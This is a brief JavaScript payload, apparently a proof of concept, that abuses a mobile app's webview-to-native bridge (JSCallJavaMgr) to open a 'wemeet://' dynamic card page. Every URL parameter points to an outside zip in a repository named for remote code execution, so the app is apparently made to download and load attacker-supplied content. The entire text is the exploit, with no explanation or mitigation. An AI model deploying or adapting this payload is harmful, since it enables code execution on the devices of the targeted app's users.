(function(){
  document.title='P115PAY';
  window.__p115=function(r){document.title='P115CB:'+r};
  var u='https://gitwhs.github.io/wm-poc-rce/p50.zip';
  var data={url:u,card_url:u,card_data_url:u,template_url:u,resource_url:u,bundle_url:u,package_url:u,download_url:u,md5:'1fcb47a1646f6b2c77c4fda65e332eee',template_md5:'1fcb47a1646f6b2c77c4fda65e332eee',resource_md5:'1fcb47a1646f6b2c77c4fda65e332eee',card_id:'p115',template_id:'p115',notification_id:'p115',card_data:'{"title":"P115","url":"'+u+'"}',from_webView:true};
  setTimeout(function(){JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p115',module:'CommonPlugin',method:'OpenNewPage',callId:'P115-CARD',param:{scheme:'wemeet://page/dynamic_card_notification',router_params:data}}))},700);
})();
